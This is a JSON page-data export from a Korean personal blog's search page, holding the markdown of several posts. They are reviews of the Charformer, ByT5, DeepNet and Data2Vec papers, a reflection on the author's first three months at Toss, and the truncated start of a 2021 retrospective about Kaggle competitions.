{"componentChunkName":"component---src-pages-search-tsx","path":"/search/","result":{"data":{"allMarkdownRemark":{"edges":[{"node":{"rawMarkdownBody":"\n## TL;DR\n\n* paper : [arXiv](https://arxiv.org/pdf/2106.12672.pdf)\n* code : [github](https://github.com/google-research/google-research/tree/master/charformer)\n\n## Related Work\n\n* [mT5 paper](https://arxiv.org/abs/2010.11934)\n* [ByT5 paper](https://arxiv.org/abs/2105.13626)\n\n## Introduction\n\n이번엔 gradient-based subword tokenization module (GBST) 를 만들었다. SentencePiece, WordPiece 나 raw text 를 받는 `token-free` 모델이 아닌 training 을 통해 subword representations 을 학습하는 무언가다. 연구에서도 강조하는 부분이 기존 `token-based` 보다 성능은 유지하며 속도 개선을 했다는 포인트다.\n\n## Architecture\n\n![img](./diff_architecture.png)\n\n기존 pretrained token-based model 인 경우엔 왼쪽처럼 token 이 모델에 들어가고 Transformer model 만 학습하는데, `CharFormer` 는 tokenizer 부분까지 학습 대상입니다.\n\n### Gradient-based Subword Tokenization (GBST)\n\ninput to GBST 는 $X \\in \\mathbb{R}^{L \\times d}$, $L$ = sequence length (input characters, utf bytes), $d$ = character embedding dimension\n\n학습을 통해서 최적의 subword segmentation 을 찾는다고 한다.\n\na subword (block) 은 다음과 같이 정의할 수 있다.\n\n$X_{i:i + b}$ of length $b$ for $1 \\leq i \\leq L- b$\n\n#### Constructing Candidate Latent Subword Blocks\n\n$s$ = stride, $b$ = subword blocks of size for $1 \\leq b \\leq M$, $M$ = maximum block size, $F : \\mathbb{R}^{b \\times d} \\in \\mathbb{R}^{d}$ = (non-parameterized) strided pooling function\n\nsequence of character embedding $X_{i:i + b} \\in \\mathbb{R}^{b \\times d}$, single subword block representation $X_{b,i} \\in \\mathbb{R} ^ {d}$\n\nsubword blocks 는 다음과 같이 표현이 가능합니다.\n\n$X_{b} = [F(X_{i:i+b});F(X_{(i+s):(i+s)+b});...]$\n\n실제로는 stride $s$ 와 block size $b$ 를 같게 세팅해서, 다시 쓰면 $X_{b} \\in \\mathbb{R}^{\\frac{L}{b} \\times d}$ 요렇게 쓸 수 있습니다.\n\n\n여기서 고민 포인트가 2가지 있을 수 있는데,\n\n* strided implementation\n* intra-blocks positions (ordering of characters)\n\nstrided implementation 이 어려웠던 이유가 모든 subwords 조합을 찾기가 현실적으로 어려웠기 때문에, $X$ 에 conv1d 연산을 해서 smoothing 느낌을 줬다고 합니다.\n\nsubword 내 character 간 positions 정보도 중요한데, 이런 정보를 살리기 위해서 각 subword 별 positional encoding 을 하려고 했지만, 이미 GBST layer 에 넣기 전 conv1d 를 하고 있고 mean-pooling function $F$ 를 사용하고 있어서 충분하다 판단했다고 합니다.\n\n#### Block Scoring Network\n\n모델이 어떤 block 을 선택할지를 학습하기 위해서 간단하게 block scoring network 를 만들었다고 합니다.\n단순한 linear transformation 형태 $F_{R} : \\mathbb{R}^{d} -> \\mathbb{R}$\n\nscore 는 다음과 같이 쓸 수 있습니다.\n\n$p_{b,i} = F_{R}(X_{b,i})$\n\n그리고 각 position $i$ 별로 (모든 block size $b$ 에 대해) 가장 적합한 block 을 찾기 위해서 softmax 해서 ranking 하는데, 공식은 다음과 같습니다.\n\n$P_{i} = softmax([p_{1,i},p_{1,i},...,p_{M,i}])$\n\n아래 이미지와 같이 동작합니다.\n\n![img](./subword_block_scoring.png)\n\n#### Forming Latent Subwords\n\nscoring 후에는 모든 subword blocks $X_{b,i}$ 에 대해서 sum 합니다. $\\hat{X}_{i} = \\sum_{b}^{M} P_{b,i}X_{b,i}$\n\n한 줄 정리하면 position 별로 optimal subword block 을 학습하게 됩니다.\n\n#### Position-wise Score Calibration\n\n위와 같이 계산하면 각 position 별로 독립적인데, 각 position 별로 서로 봐 주는(?) 무언가가 있으면 더 좋지 않을까라 생각해서 모든 position 에 대해서 dot product 해서 score 를 구하는 module 을 만들었다고 합니다.\n\n$\\hat{P} = softmax(P\\hat{P})P$, $\\hat{P} \\in \\mathbb{R}^{L \\times M}$\n\n### Downsampling\n\n마지막으로 candidate block 을 구한 후, sequence length 를 줄이기 위해서 downsampling 을 합니다.\n\ndownsampling function $F_{D} : \\mathbb{R}^{L \\times d} -> \\mathbb{R}^{\\frac{L}{d_{s}} \\times d}, d_{s} factor$, sequence of latent subwords $[\\bar{X_{1}},...,\\bar{X_{L}}]$ to $\\bar{X}$\n\n### Transformer Stack\n\nT5 와 큰 차이점은 없고 (encoder-decoder architecture), 다만 character-level input 을 사용하다보니 `ByT5` 처럼 architecture design 이 달라지는데, 그래서 re-scaling parameters 를 했다고 한다 (구체적인 부분은 논문에...).\n\n한 줄 요약하면 논문에서 비교 benchmark 가능하게끔 적절하게 조절했다고 한다.\n\n## Performance\n\n### Model benchmark\n\n![img](./performances.png)\n\n여러 모델 간 성능 비교를 했을때 기존 T5 와 comparable 한 성능을 보여주고 있다.\n\n### Speed benchmark\n\n![img](./speed_benchmark.png)\n\n기존 character-level 보다도 학습 속도가 빠르다는 것도 보여주고 있다.\n\n## Conclusion\n\ntokenizer 를 trainable 하도록 넣은 점에서 재밌는 연구였다. 아쉬운 점은 다른 architecture (e.g. encoder-only, ...) 와 task 에 대한 실험이 있었으면 좋았을 거 같고 inference 도 학습 연산량, 속도 이외에 더 다양한 자료가 있으면 실제로 얼마나 차이가 있는지 더 와닿지 않았을까 생각이 들었다.\n\n결론 : 굳굳\n","excerpt":"TL;DR paper : arXiv code : github Related Work mT5 paper ByT5 paper Introduction 이번엔 gradient-based subword tokenization module (GBST) 를 만들…","fields":{"slug":"/charformer/"},"frontmatter":{"date":"Aug 10, 2022","title":"Charformer - Fast Character Transformers via Gradient-based Subword Tokenization","tags":["Deep-Learning"],"update":"Aug 10, 2022"},"timeToRead":5}},{"node":{"rawMarkdownBody":"\n## TL;DR\n\n* paper : [arXiv](https://arxiv.org/abs/2105.13626)\n* code : [github](https://github.com/google-research/byt5)\n\n## Related Work\n\n* [CANINE](https://arxiv.org/abs/2103.06874)\n* [mT5 paper](https://arxiv.org/abs/2010.11934)\n\n## Introduction\n\n기존 LM 에서는 tokenizer 를 사용하고 있어 여러 측면에서 단점이 있는데, 이런 문제를 해결하기 위해 `token-free` LM 모델을 제안했습니다.\n\n`token-free` model 은 말대로 tokenizer 를 활용하지 않고 byte or character-level (utf-8 encoded) raw text 를 input 으로 받는 형태인데, 여러 장점이 존재합니다.\n\n1. tokenize 하는 code or service 를 관리할 필요가 없다. (서비스 복잡도가 낮아지고 운영 부담 줄어든다.)\n2. OOV (Out-Of-Vocabular) case 가 없다.\n  * 특히 `T5` 같이 multi-lingual LM 인 경우에 더 유리\n3. noisy-robust 하다.\n\n그래서 이번 논문의 contributions 은 크게 3가지 입니다.\n\n1. `token-free` model 시도\n2. 기존 `token-based` model 에서 최소한의 수정으로 가능하게끔 구현\n3. 여러 metrics, measurements 에서 `token-based` 에 comparable (or outperform) 한 architecture design\n\n## Architecture\n\n### Pretraining\n\n![img](./pretrain_stage.png)\n\n위 이미지가 `PLM` 만드는 방법인데, `mT5` architecture 를 base 로 합니다. `mT5` vs `ByT5` 를 비교하는데, 다음과 같은 차이가 있습니다.\n\n| architecture / features | text | mask | enc/dec |\n| :---: | :---: | :---: | :---: |\n| mT5 | SentencePiece | ~ 3 subword tokens | equal depth (`enc` = `dec`) |\n| ByT5 | raw text (utf-8 encoded) | ~ 20 bytes | `enc` is **3x** deeper than `dec` |\n\nrecipe 에 주목할 만한 차이점이면, 기존 (mT5) 에는 ~ 3 tokens 를 mask 했다면 이번 연구에선 성능상 더 이점이 있어서 더 긴 길이를 (~ 20 bytes) mask 했습니다.\n\n또한, encoder 가 decoder 보다 3x 더 깊은데 이것도 실험 결과 byte-level models 에선 encoder 가 더 깊은 게 좋다고 합니다.\n\n### Design and costs\n\ntoken 에서 byte-level character 로 바뀌면서 architecture design & recipe 에 차이가 생길겁니다. 크게 3가지가 변경점이 있을 텐데,\n\n1. softmax-layer (output matrices) at the `Decoder`\n2. sequence-length (~ attention)\n3. data efficiency\n\n#### softmax-layer at the `Decoder`\n\n`mT5-base` 기준으로 decoder 에 output matrices 부분의 parameter 가 전체 모델의 parameter 대비 66% 를 차지합니다 (토큰 수가 많아서).\n그런데, `ByT5` 는 byte-level output 을 주기 때문에 parameter 가 훨 작은데, 논문에서는 *동일한 parameter 규모를 가정*하면 transformer layer 를 더 쌓거나 hidden size 를 더 크게 가져가는 등 complexity 측면에서 이득을 볼 수 있다고 합니다.\n\n#### sequence length\n\nbyte-level 로 가면서 token 보다 sequence length 가 길어질텐데, time & space complexity 가 heavy 해 질 수 있다. 무언가 이걸 해결하기 위한 가볍고 빠른 attention 을 utilize 하지는 않은 듯 합니다.\n\n#### data efficiency\n\n![img](./per_language_compression_rates.png)\n\n(mC4 dataset 기준) 언어 토큰 별 평균 byte 길이를 보여주는 건데, 2.5 ~ 9 bytes 에 평균 4 bytes 라고 합니다. 즉, 다른 모델과 같은 세팅으로 훈련하게 된다면 (fixed sequence length, training steps) 4 배 짧은 문장을 학습하게 됩니다. (e.g. 512 tokens -> 128 tokens)\n\n## Performance\n\n### GLUE benchmark\n\n![img](./glue_performance.png)\n\nsmall, base 모델은 `ByT5` model 이 좋은데, 커 질수록 `mT5` 가 더 좋다. 그런데, 작은 모델에서 `mT5` 가 성능이 좋지 못한 이유가 decoder output layer 크기가 압도적으로 커서 다른 부분이 집중을 못 하는 issue 가 있다라고 해서, 사실상 그냥 comparable 하다라 보는 게 적절하다 생각함\n\n### Generation benchmark\n\n![img](./generation_performance.png)\n\ngeneration task 에선 잘한다.\n\n### Inference Speed\n\n![img](./inference_speed.png)\n\ntrain은 조금 느리고, inference는 더 많이 느리다.\n\n## Conclusion\n\n개인적으론 `token-free` model 접근은 재밌었지만 (`token-free` 개념 자체는 처음이 아니지만), utf-8 encoded bytes 를 input 으로 넣어주면서 다른 `token-based` model 대비 상대적으로 짧은 sequences 를 다루게 되면서 이 부분은 아쉬웠고, 일반적인 상황에서의 사용성을 생각하면 현재 연구 자체로는 너무 specific 하다고 생각한다. short-medium length 의 multi-lingual tranlsation 에만 적합한 느낌.\n\n저자 왈 단점 때문에 속도가 느려지는 게 toeknizer 운영 cost 생각하면 괜찮지 않나? 라는 입장도 어느 정도 reasonable 하다 생각한다.\n\n그래도 후속 연구에서 generation & translation tasks 에 한정이 아닌 general manner 하면서 performance 도 comparable 한 무언가가 나오지 않을까?\n\n결론 : 굳\n","excerpt":"TL;DR paper : arXiv code : github Related Work CANINE mT5 paper Introduction 기존 LM 에서는 tokenizer 를 사용하고 있어 여러 측면에서 단점이 있는데, 이런 문제를 해결하기 위해 …","fields":{"slug":"/byt5/"},"frontmatter":{"date":"Aug 09, 2022","title":"ByT5 - Towards a Token-Free Future with Pre-trained Byte-to-Byte Models","tags":["Deep-Learning"],"update":"Aug 09, 2022"},"timeToRead":4}},{"node":{"rawMarkdownBody":"\n## TL;DR\n\n최근 논문을 보면 complex 한 architecture를 design 하기보다는 training recipes을 제안하거나 large-scale 모델을 더 stable하게 학습하는 방법 등의 논문들이 많이 나오는 경향입니다 (개인적으로도 좋은 연구 방향이라고 생각함). 이번 microsoft에서 나온 `DeepNet`은 NLP에서 주로 `Transformer`를 쌓는데, `어떻게 하면 깊게 쌓아도 모델을 stable하게 학습할 수 있을까?`에 대한 연구를 진행했습니다.\n\n아래는 시간에 따른 Transformers depths 변화인데, 최근 deepmind의 `Gopher`만 해도 ~ 200 depths 인 데 엄청나게 변화가 생겼네요.\n\n![transformer-depths](./transformer-depths.png)\n\n* github : [repo](https://github.com/microsoft/unilm)\n* paper : [arxiv](https://arxiv.org/pdf/2203.00555.pdf)\n\n## Related Work\n\ndepth가 깊은 Transformer를 학습할 때 학습을 stablize 하는 여러 논문이 있는데, 관련 있는 최근 논문 하나를 적어보면 `Gopher`가 있습니다.\n\n* `Gopher` : [arXiv](https://arxiv.org/abs/2112.11446)\n\n## Architecture\n\n논문을 1장 요약하면 아래 이미지로 요약 가능합니다. 기존에는 `Post-LN` -> `Pre-LN` scheme을 통해 stability + performance 를 올리는 연구가 있었는데, `Pre-LN` 는 layer depths가 뒤로 갈 수록 앞 layer보다 gradient norm이 커지면서 performance degradation이 올 수 있다는 점을 이야기합니다.\n\n`DeepNet`에서는 이 부분은 `initializations`을 잘해서 해결합니다.\n\n![initiaizers](./initializers.png)\n\n### initialization\n\n더 구체적으로 보면 크게 2가지인데,\n\n1. residual connection 하는 부분에서 input 에 대해 scaling\n2. 거의 비슷한데 (기존과 같이 xavier normal), 일부 layer에 gain 수정\n\n$\\alpha$ 는 depth가 깊어질수록 커지고, $\\beta$ (gain) 은 작게 사용하네요.\n\nformula 로 일반화 하면 아래와 같습니다.\n\n> $x_{l + 1} = LN(\\alpha x_{l} + G_{l}(x_{l}, \\theta_{l}))$\n\n* $\\alpha$ : scaling factor at the residual connection\n* $l$ : $l$-th Transformer sub-layer (e.g. FFN or MSA) with parameter ($\\theta$)\n\n## Performance\n\n다양한 NLP task와 benchmarks를 진행했는데, large-scale 에서 diverge하지 않고 더 깊게 쌓았을 때 더 좋은 성능을 보여주고 있습니다.\n\n### BLEU score\n\n![bleu](./bleu-benchmark.png)\n\n### BLEU score by depths\n\n다른 methods 는 18 dethps (약 `large` recipe) 정도만 돼도 diverge 하네요.\n\n![blue-depths](./bleu-by-depths.png)\n\n## Conclusion\n\n갠적으로도 training recipe 를 통한 성능 향상이나 이런 느낌의 연구들을 좋아하는데, 1000 depths large-scale transformer 를 간단한 방법으로 stable 하게 학습할 수 있다는 점에 재밌는 거 같습니다.\n\n결론 : 굳굳\n","excerpt":"TL;DR 최근 논문을 보면 complex 한 architecture를 design 하기보다는 training recipes을 제안하거나 large-scale 모델을 더 stable하게 학습하는 방법 등의 논문들이 많이 나오는 경향입니다 (개인적으로…","fields":{"slug":"/deepnet/"},"frontmatter":{"date":"Mar 20, 2022","title":"DeepNet - Scaling Transformers to 1,000 Layers","tags":["Deep-Learning"],"update":"Mar 20, 2022"},"timeToRead":2}},{"node":{"rawMarkdownBody":"\n## TL;DR\n\n벌써 토스로 이직한 지 3달이 됐네요. 사실 블로그에 글로 쓸 생각은 없었는데, 짧지만 정말 여러 가지를 생각하고 느끼기도 했고 입사 당시에는 토스 문화에 대해서 잘 알지 못했는데, 여기에 남겨보면 어떨까 해서 글을 씁니다.\n\n토스 문화에 관심 있으시거나, 저랑 같은 고민을 하신 분들 등 분들에게 정보나 공감이 되지 않을까 생각했어요. 어쩌면 나중에 다른 곳에서 같은 고민을 하고 있을 때 도움이 될 거 같기도 합니다.\n\n## 회사 고르는 기준\n\n작년 21년 회고에서도 말했듯, `회사를 고르는 기준`에 큰 변경이 있었어요. 전/후로 차이를 비교하면 아래와 같은데, 3년 동안 많이 바뀐 거 같아요 **180도 달라진 기준**이라 생각해요. (~~그래도 GPU는 못 참습니다~~)\n\nAs-Is (2019년)\n\n1. 내가 (직무에서) 기술적으로 성장할 수 있는 환경\n2. 같은 background가 있는 동료와 재밌게 일 할 수 있는 환경\n3. GPU 많은 곳 (진심)\n\nTo-Be (2021년)\n\n1. 내가 주도할 수 있는 환경 (기술, 문화 모든 것을)\n2. 나와 다른 background를 가지고 있는 사람들과의 협업\n3. 현업 (기술적인 부분)이나 이외에서 직접 설득하는 일이 많은 곳\n4. GPU 많은 곳 (진심)\n\n사실 아직 **As-Is** 기준을 선호하긴 하지만, 제가 더 성장하려면 새로운 환경이 필요했고 단순히 개발 잘하는 사람이 아니라 사람들을 설득하고 공감을 얻고 팀 규모의 문화나 기술을 정착하고 관리하려면 **To-Be** 경험이 필요하다 판단했어요.\n\n## 입사전\n\n들은 이야기가 하나 없는 회사니 면접 전에 팀원 분과 tea time 가지면서 여러 이야기도 나눴고 면접 때도 어떤 회사와 팀일 거 같다는 예측(?)을 했는데, 이전에 ML/DL 서비스를 시도한 적 없는 신생 회사/팀이고 계신 분들도 ML/DL 쪽으로 background가 크게 없는 등 큰 장애물이 있다 생각했지만, 이런 환경도 극복하고 직접 문화를 만들어 나가는 과정에서 배우는 점이 있을 거라 생각했어요. 결국 **To-Be**에는 토스가 적합하다 생각해서 합류하게 됐습니다.\n\n## 입사후\n\n입사전 우려와 같이 **제가 생각한 방향과 전혀 맞지 않았어요**. 하지만, 바로 제가 생각하는 방향으로 작업하거나 피드백을 주지 않았어요. 이유는 아래와 같아요.\n\n### 공감\n\n아마 토스 블로그나 여러 자료를 보면 토스에서 가장 중요하게 생각하는 것 중 하나가 있는데 바로 **공감, 신뢰** 입니다. 제가 동료의 신뢰나 하는 일에 공감 없이 진행한다면 그 일은 지지를 받지 못하고 결국 쓸모없는 일이 됩니다. 또한, 이전의 context 이해 없이 방향을 제시하는 건 대단히 조심해야 하는 행동이라 생각해요.\n\n그래서 문제점이 보여도 바로 피드백하지 않고 처음 1달 정도는 팀과 회사의 context를 이해하는 데 노력하고 동료의 신뢰를 얻는 데 노력했어요. 물론 정말 침묵과 100% 수용만 하는 게 아닌 새로운 문화를 도입하기 위해서 문서를 통해서 회의 때 공유하거나 하는 등의 노력도 꾸준히 했습니다.\n\n개인적으로도 **이 과정이 너무 답답하기**도 했어요. 빠르게 체계적인 팀 문화를 도입하고 효율적으로 제품을 만들어야 하는데, 이런 과정이 길어지면 제대로 속도도 내지 못하고 효율이나 퀄리티도 보장하지 못한다 생각합니다. **하지만**, 신뢰와 공감을 얻지 못하고 아무리 좋은 방향이라 해도 도입했다면, 어쩌면 다른 분들에게 상처를 줄 수도 있고 제 일도 잘할 수 없다는 점을 통해 이런 과정이 **필수적이다** 라는 것을 깨달았어요.\n\n### 공감 & 신뢰 얻는 법\n\n동료의 공감과 신뢰를 얻기 위해서 저는 다음과 같은 일들은 했어요.\n\n1. 팀에서 비효율적인 부분 빠르게 개선 및 적용하기. 문서로 정리 & 공유하기\n2. 빠르게 눈에 보이는 성과 내기\n3. 팀원들 도와주기\n\n이전 DS 팀에는 code convention이나 CI/CD 등 규칙 및 문서들이 존재하지 않았고, 퀄리티나 안정성, 문서화보단 일단 완성하고 보자 방식으로 업무를 진행해서 lagacy가 산재해 있었습니다. 저희 팀은 Notion을 주로 사용하는데, 저는 이런 convention이나 규칙들을 문서화하고 팀에게 공유해서 필요성과 우선순위에 대한 공감을 얻었습니다.\n\n그리고 foramtter와 linter를 repository에 직접 적용하고 깔끔하고 좋은 코드를 구현하기 위해서 팀 전반적인 PR의 code-review에 참여 했습니다. 이외에도 MLOps 및 모델 연구관점에서 life-cycle, 여러 ML/DL 지식 등 많은 문서를 작성했는데 이 부분도 공감 받아 팀 문화적으로도 `필수적인 문서화`에 조금씩 기여하고 있는거 같아요.\n\n이전에도 code-review 하는 문화가 있었지만, 제대로 이뤄지고 있지 않아서 이 부분도 손 걷어붙이고 제가 주도하면서 다른 분들도 그냥 LGTM이 아닌 건전하게 의견을 제시할 수 있게끔 했던 거 같아요. 아직도 개선하기 위해서 노력 중 입니당.\n\n정리하면,\n\n1. 팀이나 개인의 부채를 적극적으로 해결하고\n2. 제 분야에서 성과를 보여주는 과정에서\n\n신뢰를 얻게 된 거 같아요.\n\n다만, 그 과정에서 가끔 저만의 아쉬움과 답답함이 나와서 부족한 모습도 있었는데, 앞으로 더 개선해야겠습니다. 처음엔 업무에서의 권한 없이 타인의 `공감과 신뢰`를 얻는 것에 대한 중요도를 잘 몰랐다면, 지금은 필요성을 알고 어려운 일이라는 걸 깨닫는 좋은 경험이었습니다.\n\n또한, 토스에서 `권한`없이 제 실력과 방향에 대해 팀원들의 신뢰와 공감을 얻는 과정에서 많은 것을 배운 거 같습니다. 감사하게도 팀원 분들께서도 피드백 주시길 개인이나 팀 단위의 공감대를 잘 형성했다 말씀해 주셔서 제 방식이 잘 먹혔던(?) 거 같아요.\n\n최근에 [회고](https://jojoldu.tistory.com/626)를 보면서 등장한 짤인데, 제 상황에 가장 알맞은 거 같아서 가져왔어요.\n\n![empathy](./empathy.png)\n\n## 지금\n\n작년까지만 해도 3달 수습기간이 있었지만, 지금은 사라졌습니다. 하지만 1.5 / 3 months review 문화는 그대로 남아있는데요, 피드백을 보면 제가 도입한 문화와 성과에 대해서 긍정적으로 생각하고 공감해 주셨다는 점에서, 토스에서 내가 목표하는 것을 잘 해내고 있다는 생각도 들고 더 좋은 팀을 만들어 나가야겠다는 생각도 드네요.\n\n토스에서는 공감만 얻을 수 있다면 누구나 프로젝트의 DRI가 될 수 있는데, 그래도 드는 생각은 저나 ML 분야에 대한 background를 잘 이해할 수 있는 분이 계셨다면 어쩌면 더 빠르게 공감을 얻을 수 있고 더 좋은 문화와 체계를 이미 도입하고 사용하지 않았을까 하는 아쉬운 점도 남아 있어요. 어쩌면, 이런 부분에선 팀장 같은 `권한`이 있으면 어떨까란 생각도 들기도 합니다.\n\n그래서 나중엔 팀장으로서 팀을 lead 하는 경험도 해 보고 싶네요.\n\n## 미래\n\n앞으로도 저는 0순위로 팀 문화를 잘 만드는 일에 기여하게 될 거 같아요. 이제 팀원들에 대한 신뢰도 얻었으니 제가 생각하는 방향에 대해서 더 적극적으로 제안하고 강하게 이야기해야 하는 부분은 이야기하게 될 거 같아요. 물론 그 중간 지점은 계속해서 잘 찾아 나가야할 거 같습니다.\n\n## 한 줄 요약\n\n처음엔 이게 맞나 생각했지만 배우는 부분도 많았고, 아직 해결할 문제가 많지만 하나씩 해결해 나가자!\n","excerpt":"TL;DR 벌써 토스로 이직한 지 3달이 됐네요. 사실 블로그에 글로 쓸 생각은 없었는데, 짧지만 정말 여러 가지를 생각하고 느끼기도 했고 입사 당시에는 토스 문화에 대해서 잘 알지 못했는데, 여기에 남겨보면 어떨까 해서 글을 씁니다. 토스 문화에 …","fields":{"slug":"/3mths-review/"},"frontmatter":{"date":"Mar 19, 2022","title":"토스 3 months review","tags":["Diary"],"update":"Mar 20, 2022"},"timeToRead":4}},{"node":{"rawMarkdownBody":"\n## TL;DR\n\nFAIR에서 `Data2Vec`이란 논문이 나왔는데, multi-modal SSL paper라 해서 흥미가 생겨서 읽게 됐습니다. 읽기 전 궁금했던 points는 modality마다 feature extraction methods가 다를텐데, 어떤 methods를 썼는지 새로운 SSL method를 사용한지 등이 궁금한 points 였습니다.\n\n* github : [repo](https://github.com/pytorch/fairseq/tree/main/examples/data2vec)\n* paper : [arXiv](https://scontent-ssn1-1.xx.fbcdn.net/v/t39.8562-6/271974914_483120576492438_4239522333319653600_n.pdf?_nc_cat=107&ccb=1-5&_nc_sid=ae5e01&_nc_ohc=9HtSivaeiYUAX_1c9_p&_nc_ht=scontent-ssn1-1.xx&oh=00_AT8HvfocQusNWG2UUeuUs-uPCgg1CowqROfH2TBtN4W8PA&oe=61FBE0D1)\n\n## Related Work\n\nrelated works가 많은데, 요약하면 각 domain에서 SSL을 하던 방식에 대한 related works가 많다.\n\n* image domain SSL 자료 많은 곳 : [github repo](https://github.com/facebookresearch/vissl)\n* BERT : 대충 BERT 논문 (MLM)\n* Wav2Vec 2.0 : [arXiv](https://arxiv.org/abs/2006.11477)\n* HuBERT : [arXiv](https://arxiv.org/abs/2106.07447)\n\n## Introduction\n\n논문에서 말하는 목표는 `modality 상관없이 general하게 잘 되는 SSL 방식을 제안`이라고 합니다. (`modality-free` SSL)\n\n## Architecture\n\n![architecture](./architecture.png)\n\narchitecture는 다음과 같습니다. (standard) Transformer 구조를 사용했고, modality 별로 encoding 방식을 특정해 적용해 넣었다고 합니다.\n\n같은 구조 (Transformer)의 TS (Teacher & Studnet) mode가 존재하고, full input representation & partial input mask prediection task를 학습하는 방식입니다.\n\nTeacher는 Student model의 weights를 EMA로 update하고 Studnet는 그대로 사용합니다.\n\n### Encoding\n\n#### Image Domain\n\nViT 하듯 합니다. 16x16 patches 로 이미지를 나누고 sequence로 다룹니다.\n\n#### Speech Domain\n\nWav2Vec 2.0 하듯 합니다. 16kHz sampling 된 waveform을 1d-cnn에 태워서 50Hz representations으로 바꿔 사용합니다.\n\n#### Text Domain\n\nBPE 씁니다. subword 기반 tokenizer로 tokenized 된 token들의 representation을 사용합니다. 구체적인 방법은 논문 chapter 4에 있습니다\n\n### Masking\n\nmasking 방식도 modality 마다 다른 방식을 적용합니다.\n\nimage는 patch-wise masking, speech는 (latent) speech representation masking, text는 token-wise masking\n\n### Training Targets\n\n모델의 학습 방식은 masked input (contexualized representation)만 predict 하는 방식으로 학습합니다. 논문에선 기존 method들은 contextual information 을 놓쳤다는 점에서 다른 점이라 말하네요.\n\n### Teacher Parameterization\n\n위에서 Teacher model의 weight를 EMA update했다 했는데, 구체적으로는 다음과 같이 update 했다고 합니다.\n\nEMA 하면 formula는 아래와 같을텐데,\n\n> let $\\delta$ = the weights\n\n> $\\delta = \\gamma \\delta + (1 - \\gamma) \\theta$\n\n논문에서 $\\gamma$는 constant 가 아닌 dynamic 하게 schedule 해서 사용했다고 합니다.\n\n첫 $n$ steps는 linear하게 $\\tau_{0}$ to $\\tau_{e}$ 증가시키고, $n$ steps 이후에는 쭉 유지시킨다 합니다. 이렇게 한 이유는 학습 초반에 teacher update 를 더 많이 시키려 했다고 합니다. ($\\tau_{0}$ = 0.999, $\\tau_{e}$ = 0.9999)\n\n더 디테일한 실험에서는 feature encoder하고 PE 부분은 EMA 하지 않는 편이 더 좋다고 합니다.\n\n### Targets\n\nTransformer architecture에서 representation을 뽑을 때 주로 마지막 Transforemr block을 mean 하는데, 여기선 last K blocks의 masked 부분만 뽑아서 mean 했다고 합니다. 아래에 나오겠지만 K에 따른 performance benchmark를 헀을 때, 6 (base 기준 절반)이 가장 잘 됐다고 합니다.\n\nformula로 쓰면 아래와 같습니다.\n\n> $y_{t}$ : time-step $t$에 대한 representation $y$,\n> $K$ : last K (Transformer) Blocks,\n> $L$ : L (Transformer) Blocks,\n> $\\alpha_{t}^{l}$ : time-step $t$ $l^{th}$ block,\n> $\\hat{}$ : normalized\n\n> $y_{t} = {1 \\over K} \\sum^{L}_{l=L - K + 1} \\hat{\\alpha_{t}^{l}}$\n\n위와 같은 targerts을 생성하면서 collapsing issue가 있다고 했다. 문제와 해결책으로는 아래와 같습니다. 한 줄 요약은 normalization 만 하면 적당히 잘 된다.\n\n1. normalization\n   * For speech domain, utilizing instance normalization\n   * For text, vision domain, utilizing parameter-less layer normalization\n2. regularizer 변경\n   * variance-invariance-covariance regularizer\n3. do not use high learning rate & short warm-up\n   * do tuning\n4. low EMA decay value\n5. longer span masking for speech domain\n\n### Objective\n\nSmooth L1 loss를 사용했다. $\\beta$는 튜닝이 필요하다고 하더라.\n\n## Performance\n\n### Computer Vision benchmark\n\n기존 vision domain SSL 성능보다 좋은 것을 보여주고 있습니다.\n\n![benchmark](./vision_benchmark.png)\n\n### Speech benchmark\n\n![benchmark](./speech_benchmark.png)\n\n### Text benchmark\n\n추가로 wav2vec 2.0 masking method (연속으로 4 tokens masking 하는)도 테스트 했는데, 더 좋은 성능을 보였다고 합니다.\n\n![benchmark](./text_benchmark.png)\n\n### K benchmark\n\n$K$ blocks 에서 $K$를 어디까지 쓸까에 대해서도 도메인 별 benchmark를 했는데, 6이 가장 무난한 값이라고 하네요.\n\n![benchmark](./k_benchmark.png)\n\n## Conclusion\n\n여러 modality를 한곳에 모아 유의미한 결과를 보였다는 점에서 재밌는 시도였다고 생각합니다. 또한 target representation을 만드는 방법 (feats. agg $K$ blocks)또 meaningful 한 거 같습니다. 하지만 새롭다기보단 기존의 방법론들을 채용해와 조립했다는 점에서 novelty가 약하지 않느냐란 생각이 들었다. 또한, hyper-parameters에 robust 하지 못한 점도 아쉬운 거 같다.\n\n결론 : 굳\n","excerpt":"TL;DR FAIR에서 이란 논문이 나왔는데, multi-modal SSL paper라 해서 흥미가 생겨서 읽게 됐습니다. 읽기 전 궁금했던 points는 modality마다 feature extraction methods가 다를텐데, 어떤 meth…","fields":{"slug":"/data2vec/"},"frontmatter":{"date":"Jan 31, 2022","title":"Data2Vec - A General Framework for Self-supervised Learning in Speech, Vision and Language","tags":["Deep-Learning"],"update":"Jan 31, 2022"},"timeToRead":4}},{"node":{"rawMarkdownBody":"\n## TL;DR\n\n2020년도 회고한 지 얼마 안된 거 같은데 벌써 2021년이 끝나가네요. 올해에도 심경의 변화나 많은 events가 일어나진 않았지만, 최근에 쓴 [퇴사부검](https://kozistr.tech/%ED%87%B4%EC%82%AC%EB%B6%80%EA%B2%80/)도 그렇고 일어난 일 하나하나 **굵직**했던 거 같아요.\n\n올해 키워드를 하나 뽑는다면 `일` 인거 같아요. 최근 2 ~ 3년 동안, 병특 회사도 구하고 여러 회사도 돌아다니고 다른 활동도 하다보니 뭔가 저 개인에게 쓸 수 있었던 시간이 거의 없었는데, 이젠 병특도 해결됐고 내년엔 좀 여유롭게 지내보고 싶네요.\n\n## Kaggle\n\n작년에 세운 목표가 `Competition Master`를 달성하자란 목표를 세웠는데, 올해 정말 아쉽게 목표를 달성하지 못했습니다. `Google Brain`에서 주최한 `Ventilator Pressure Prediction`라고 lung ventilator의 데이터로 `pressure` sequence를 예측하는 대회가 있었는데, 아쉽게 `20th / 2605`을 하면서, 금메달을 얻지 못했습니다.\n\n![kaggle](./kaggle.png)\n\n그래도 올해 했던 일 중 가장 뿌듯하고 재밌었던 일이었는데, 작년 `Birdcall Identification Challenge`처럼 다른 분과 team up 해서 대회를 진행했습니다. 그 과정에서 서로 아이디어와 전략을 내고 토론하는 과정이 정말 재밌었고 이렇게 열심히 열정적으로 일한 적이 언제였지? 란 생각도 들면서 회사에 대한 현타도 동시에 들더라고요.\n\n그래도 CV에 적어둔 실적들을 보니까 매년 성장하고 있는 느낌이 들어서 뿌듯하네요.\n\n![challenge](./challenge.png)\n\n쨋든 아쉽지만 올해는 달성하지 못 했으니 내년에도 다시 열심히 해 봐야 겠어요. 물론 `Compeition GrandMaster`가 되는 날 그 